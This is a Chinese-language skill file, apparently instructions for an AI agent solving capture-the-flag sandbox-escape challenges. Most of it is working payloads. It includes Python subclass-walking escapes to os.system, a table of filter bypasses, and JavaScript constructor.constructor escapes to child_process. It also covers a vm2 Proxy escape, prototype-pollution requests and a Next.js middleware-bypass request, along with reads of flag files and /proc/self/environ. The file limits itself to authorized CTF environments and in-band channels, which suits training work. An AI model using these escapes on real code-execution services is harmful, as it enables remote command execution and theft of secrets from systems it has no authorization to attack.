---
name: code-exec
description: 在线代码执行与沙箱逃逸。用于在线 Python/JS 执行、规则引擎、代码编辑器、评测环境、RSC/multipart 端点等场景，覆盖 Python/JS 运行时识别、沙箱缺陷、原型污染和带内结果验证。 使用 curl、python3 与带内回显。
---

# 代码执行与沙箱逃逸

目标：拿到 `os.system` / `subprocess` / `child_process` / `fs`，直接读 flag。

## 0. 探测运行时（≤30s，先看清限制）

```bash
curl -s -X POST http://TARGET/ -H 'Content-Type: application/json' -d '{"code":"print(1+1)"}'
curl -s -X POST http://TARGET/ -H 'Content-Type: application/json' \
  -d '{"code":"import sys;print(sys.version,sys.implementation.name)"}'
curl -s -X POST http://TARGET/ -H 'Content-Type: application/json' \
  -d '{"code":"print(dir(__builtins__))"}'
```

**认真读回显的错误**：报错会直接告诉你禁用了哪个模块、有没有 audit hook。这是绕过的最短路径。

## 1. Python 沙箱逃逸

```python
# 基础：从 object 子类找可利用类
().__class__.__base__.__subclasses__()
# 找 os._wrap_close / subprocess.Popen / warnings.catch_warnings
[x for x in ().__class__.__base__.__subclasses__() if 'warning' in x.__name__][0]()._module.__builtins__['__import__']('os').system('id')

# 直接读文件（限制最松时的最优解）
print(open('/flag').read())
print(open('/challenge/flag.txt').read())
print(open('/proc/self/environ').read())
```

**过滤绕过对照**

| 被禁 | 替代 |
|---|---|
| `__` 下划线 | `getattr(obj, '_'*2+'class'+'_'*2)`、`chr(95)` 拼接 |
| `import` | `__import__`、`importlib.import_module`、`__builtins__['__import__']` |
| `open` | `io.open`、`pathlib.Path().read_text()`、`os.popen('cat /flag')` |
| `os` / `subprocess` | `__import__('o'+'s')`、已加载模块的 `__globals__` |
| `eval`/`exec` | `compile`、`getattr(builtins,'ev'+'al')` |
| `sys.addaudithook` 审计 | 用白名单函数（`os.listdir`、已加载模块）间接读；或找 `_posixsubprocess` |

**审计钩子下的思路**：审计只拦特定事件（如 `open`），但 `os.listdir` + 已打开的 fd 往往不被拦；也可通过 `os.stat` 判断文件存在后，用 `subprocess` 被拦时改用 `ctypes` 直接 syscall。

## 2. JavaScript 沙箱逃逸

```javascript
// 通用：从任意函数摸回宿主 Function
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag').toString()
[].constructor.constructor('return process')()
(()=>{}).constructor('return process')()

// 拿环境变量（常直接有 FLAG）
this.constructor.constructor('return process')().env

// 读文件
this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/flag','utf8')
```

**vm2（< 3.9.17）Proxy apply trap**
```javascript
const handler = { apply(target, thisArg, args) {
    return args.constructor.constructor('return process')();
}};
new Proxy(function(){}, handler)().mainModule.require('child_process').execSync('id');
```

**取宿主对象的另一条路**
```javascript
Error.prepareStackTrace = (e, st) => st;
new Error().stack;   // 栈帧里带宿主对象引用
```

**isolated-vm**：通常隔离较彻底，重点转向：是否暴露 `console`/`callback` 桥、能否通过内存越界或原型污染触达宿主。

## 3. 原型污染 / RSC / 反序列化（Node 侧）

```bash
# 通用 __proto__ 污染探测
curl -s -X POST http://TARGET/api -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'
curl -s -X POST http://TARGET/api -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"env":{"FLAG":"x"}}}}'
```

**Next.js RSC 相关解析缺陷：先核对题目实际版本与补丁状态**
```
POST /apps HTTP/1.1
x-middleware-subrequest: middleware
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="0"

{"__proto__":{"status":1,"headers":{}}}
------x--
```

## 4. 规则引擎类（自研"单行规则"）

遇到"规则引擎/条件判定/表达式求值"（如 CloudFunc 类平台的触发器规则）：

1. 先测语法：`1+1`、`true`、`exists(x)`
2. 试函数白名单：`exec`、`system`、`eval`、`Runtime`、`require`
3. 试模板注入：`${7*7}`、`{{7*7}}`、`#{7*7}`
4. 试逃逸到宿主：`__proto__`、`constructor.constructor`
5. **关键**：规则引擎的判定结果（true/false）本身就是布尔盲注信道——把 flag 拆成条件逐位判断

## 5. 无回显时

赛场默认无外网。优先比较题目接口返回、错误、时间、日志和同题可读文件等带内通道；写入只限当前题的授权环境。没有证据时只记录待验证假设。

## 6. 反模式

- ❌ 直接堆一长串公开 payload，不看报错 → 先确认运行时与限制。
- ❌ 忽略报错 → 报错暴露的禁用名单就是绕过地图。
- ❌ 只试 Python 思路打 Node 环境（反之亦然）——先确认语言。
- ❌ 沙箱题死磕 RCE，而 flag 其实就在 `env` 里。

## 7. 输出

`运行时判定 + 逃逸链（每步可复现）+ 读取 flag 的最终代码`。

遇到成熟组件先按系统规则检索本地知识与题目版本。不要把公开 payload 在未知版本上反复发送；确认前置条件后只测最小样本。
